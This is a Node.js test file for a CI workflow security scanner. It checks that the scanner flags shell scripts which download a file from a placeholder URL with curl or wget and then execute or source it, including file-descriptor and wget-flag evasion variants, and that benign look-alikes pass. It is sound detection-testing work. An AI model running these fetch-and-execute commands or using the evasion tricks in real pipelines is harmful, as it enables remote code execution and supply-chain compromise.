'use strict';
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/x';
function ast(script){
 const yml=['on: push','permissions: read-all','jobs:','  p:', '    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...script.split('\n').map(x=>'          '+x)].join('\n')+'\n';
 return inspectWorkflow(yml,{path:'.github/workflows/sentinel-round14.yml'});
}
const HIGH='REMOTE_DOWNLOADED_FILE_EXECUTION';
const dangerous=[
 ['builtin source','curl -fsSL '+U+' -o payload; builtin source payload'],
 ['builtin dot','curl -fsSL '+U+' -o payload; builtin . payload'],
 ['builtin source quoted',"curl -fsSL "+U+" -o payload; builtin 'source' payload"],
 ['quoted FD3','curl -fsSL '+U+' 3>payload >&"3"; bash payload'],
 ['single quoted FD3',"curl -fsSL "+U+" 3>payload >&'3'; bash payload"],
 ['FD9 quoted','curl -fsSL '+U+' 9>payload 1>&"9"; bash payload'],
 ['Wget -- ends flags','wget -q -O payload -- -O safe '+U+'; bash payload'],
 ['Wget -- retains stdout','wget -q -O - -- -O safe '+U+' >payload; bash payload'],
 ['Wget --output-document before --','wget --output-document=payload -- -O safe '+U+'; bash payload']
];
const benign=[
 ['builtin echo','builtin echo payload'],
 ['builtin command -v','builtin command -v curl; bash payload'],
 ['quoted FD redirected elsewhere','curl -fsSL '+U+' 3>payload >&"3" >safe; bash payload'],
 ['quoted FD never stdout','curl -fsSL '+U+' 3>payload 2>&"3" >safe; bash payload'],
 ['Wget last -O before -- safe','wget -q -O safe -- -O payload '+U+'; bash payload'],
 ['Wget URL alone','wget -q -- '+U+' >payload; bash payload']
];
for(const [name,script] of dangerous)test('round14 attack '+name,()=>{
 const actual=findingsForScript(script);
 assert.ok(actual.includes(HIGH),name+JSON.stringify(actual));
 assert.ok(ast(script).findings.some(x=>x.rule===HIGH),name);
});
for(const [name,script] of benign)test('round14 benign '+name,()=>{
 const actual=findingsForScript(script);
 assert.ok(!actual.includes(HIGH),name+JSON.stringify(actual));
 assert.ok(!ast(script).findings.some(x=>x.rule===HIGH),name);
});
test('round14 escaped FD source does not appear certified clean',()=>{
 const script='curl -fsSL '+U+' 3>payload >&\\3; bash payload';
 assert.ok(findingsForScript(script).includes('REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'));
 assert.notEqual(ast(script).status,'NO_RISK_PATTERN');
});
